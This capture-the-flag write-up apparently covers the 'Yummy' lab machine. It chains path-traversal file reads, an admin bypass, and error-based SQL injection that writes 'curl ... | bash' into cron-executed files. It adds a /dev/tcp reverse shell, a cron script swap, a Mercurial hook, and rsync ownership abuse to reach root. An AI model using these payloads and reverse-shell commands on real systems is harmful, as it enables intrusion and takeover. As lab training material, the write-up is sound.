summary: Yummy is running a website for booking a restaurant. The site allows us to download an iCalendar file, the endpoint of which is vulnerable to an LFI. Using this we're able to download the web files and spot a vulnerability with accessing the Admin dashboard. The dashboard is vulnerable to SQLi which gives us an Arbitrary file write vulnerability. Mixing this with the crontab information we're able to get a shell on the box.

# Enumeration
we find the following ports open:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
# Gaining Foothold

Port `80` has an `http` server running what seems to be a web app for booking appointments for a restaurant.

Looking around we can register an account, login, and create bookings, none of which seem to be vulnerable to `SQLi` or `XSS` on inital testing.

Once we book a table an entry appears in the dashboard of the user with the corressponding email:
![image](/assets/img/2025-02-25-Yummy/Pasted image 20250123173631.png)
Intercepting the `Save ICalendar` button shows `export` an interesting endpoint that downloads files:
![image](/assets/img/2025-02-25-Yummy/Pasted image 20250128230442.png)
which we can use to trigger a LFI:

```
GET /export/../../../../../../../../../../etc/passwd HTTP/1.1
<SNIP>
```

Which gets us `/etc/passwd`

```
<SNIP>
dev:x:1000:1000:dev:/home/dev:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
caddy:x:999:988:Caddy web server:/var/lib/caddy:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
qa:x:1001:1001::/home/qa:/bin/bash
_laurel:x:996:987::/var/log/laurel:/bin/false
```

Attempting to read `ssh` keys for users: `qa` and `dev` nothing there. However, I am able to find `/etc/crontab` which gives us more files to take a look at:

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |

  */15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
  * * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
```

`app_backup.sh` gives us the directory of the backup files:

```
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
```

Downloading the backup files we find database credentials in `app.py`

`chef`:`3wDo7gSRZIwIHRxZ!`

and an admin panel location:

`/admindashboard`

which requires authentication.

Looking deeper into the code I notice that the way it authenticates is vulnerable as it looks for the value: `"administrator"` from the validation:

```python
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))
```

in the `validate_login()` function we see that it returns `email`

```python
def validate_login():
    try:
        (email, current_role), status_code = verify_token()
        if email and status_code == 200 and current_role == "administrator":
            return current_role
        elif email and status_code == 200:
            return email
        else:
            raise Exception("Invalid token")
    except Exception as e:
        return None
```

The site validates email input through the frontend, however if we interecept the `Register` and `Login` requests we can change the `email` to `administrator`

which grants us access to the admin panel:

![image](/assets/img/2025-02-25-Yummy/Pasted image 20250123184749.png)

Looking back at the code we notice that the parameter `o` is directly inputed into an SQL query:

```python
                # added option to order the reservations
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
```
which we can abuse by inputting the parameter in the url:
```
http://yummy.htb/admindashboard?s=edu&o=ASC' OR 1=1
```
![image](/assets/img/2025-02-25-Yummy/Pasted image 20250123194732.png)
SQL query output is not visible however errors are, which we can validate through this url SQLi:
```
http://yummy.htb/admindashboard?s=&o=ASC; SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
```
![image](/assets/img/2025-02-25-Yummy/Pasted image 20250123195112.png)
Checking if there's a table named users through this url SQLi:
```
http://yummy.htb/admindashboard?s=edu&o=ASC; SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (select group_concat(table_name) from information_schema.tables where table_name='users')))
```
![image](/assets/img/2025-02-25-Yummy/Pasted image 20250123195132.png)

keep in mind, the error above wouldn't show if the users table didn't exist.

Grabbing user columns using this url SQLI:
```
http://yummy.htb/admindashboard?s=edu&o=ASC; SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (select group_concat(column_name) from information_schema.columns where table_name='users')))
```
![image](/assets/img/2025-02-25-Yummy/Pasted image 20250123200033.png)

Looking around further, we can use the following link with SQLi to deduce that we have an arbitrary file read:
```
http://yummy.htb/admindashboard?s=&o=ASC;%20SELECT%20%27foo%27%20WHERE%201=1%20AND%20EXTRACTVALUE(1,%20CONCAT(0x5c,%20(select%20@@secure_file_priv)))
```
Which returns:

![image](/assets/img/2025-02-25-Yummy/Pasted image 20250128190705.png)

indicating that we can write anything on path `\\` which means we can write anywhere on the system.

Looking back at `/etc/crontab` we notice `dbmonitor.sh`, using the LFI we found earlier we can check the contents of `dbmonitor.sh`:

```
#!/bin/bash
 
timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)
 
if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi
 
[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
```
We notice that it checks for `dbstatus.json` and if it doesn't fit what it's looking for then it triggers scripts off the latest version using a regex: `fixer-v*`

Using this we can clear out `dbstatus.json` with:

```
http://yummy.htb/admindashboard?s=&o=ASC;select+"curl+10.10.14.5/rev.sh+|bash;"+INTO+OUTFILE++'/data/scripts/dbstatus.json'; 
```
and then write a script that matches the regular expression using a payload:
```
http://yummy.htb/admindashboard?s=&o=ASC;select+"curl+10.10.14.5/rev.sh+|bash;"+INTO+OUTFILE++'/data/scripts/fixer-vSHELL';
```
And after some time we get a shell:
# MySQL 
```
Ncat: Connection from 10.10.11.36.
Ncat: Connection from 10.10.11.36:49988.
bash: cannot set terminal process group (2017): Inappropriate ioctl for device
bash: no job control in this shell
mysql@yummy:/var/spool/cron$
```
Seeing that `app_backup.sh` is run by `www-data` we can upgrade our shell by writing a new file called `rev2.sh`:
```
bash -i >&/dev/tcp/10.10.14.5/8001 0>&1
```
grabbing that file, and replacing app_backup.sh, we can use `mv` since we have write access in the directory:
```console
mysql@yummy
$ wget 10.10.14.5/rev2.sh
$ mv app_backup.sh app_backup.bak
$ mv rev2.sh app_backup.sh
```
we wait for the cron job and get a shell:
# WWW-DATA
```
Ncat: Connection from 10.10.11.36.
Ncat: Connection from 10.10.11.36:55190.
bash: cannot set terminal process group (2713): Inappropriate ioctl for device
bash: no job control in this shell
www-data@yummy:~$
```
we find `/var/www/app-qatesting/.hg` has the following credentials:

`qa`:`jPAd!XQCtn8Oc@2B`

we can SSH!:
```console
$ssh qa@yummy.htb
qa@yummy:~$
```
# Privilege Escalation
`qa` has the following sudo privileges:
```console
$ sudo -l
Matching Defaults entries for qa on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User qa may run the following commands on localhost:
    (dev : dev) /usr/bin/hg pull /home/dev/app-production/
```
`hg` is a command like tool for `mercurial` a source control management tool similar to git. One of the files: `.hgrc` can have a `[hooks]` section. According to

[mercurial](https://www.mercurial-scm.org/doc/hgrc.5.html#hooks)

`hooks` are:
```
Commands or Python functions that get automatically executed by various actions such as starting or finishing a commit. Multiple hooks can be run for the same action by appending a suffix to the action. Overriding a site-wide hook can be done by changing its value or setting it to an empty string. Hooks can be prioritized by adding a prefix of priority. to the hook name on a new line and setting the priority. The default priority is 0.
```
So we write `/tmp/rev.sh`, we write it in tmp so both `qa` and `dev` have access to it.

then we write a directory `.hg` with `hgrc`(copied from `/home/qa/.hgrc`):
```
[hooks]
post-pull = /tmp/rev.sh
```
lastly execute the command as `dev`:
```console
$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/
```
We have a callback as `dev`:
```console
# nc -lvnp 9001                                                                                                                                       Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.36.
Ncat: Connection from 10.10.11.36:42634.
I'm out of office until January 29th, don't call me
dev@yummy:/tmp$
```
Transferring ssh keys to get a more stable shell.
checking `sudo -l` once again we see we have `rsync` on the app into `/opt` using this we can copy `/bin/bash` and set the sticky execution bit, and execute `rsync` with `--chown root:root` to make the bash have `root` as it's owner.
```console
$ sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* --chown root:root /opt/app/
```
just like that, we have `root`!
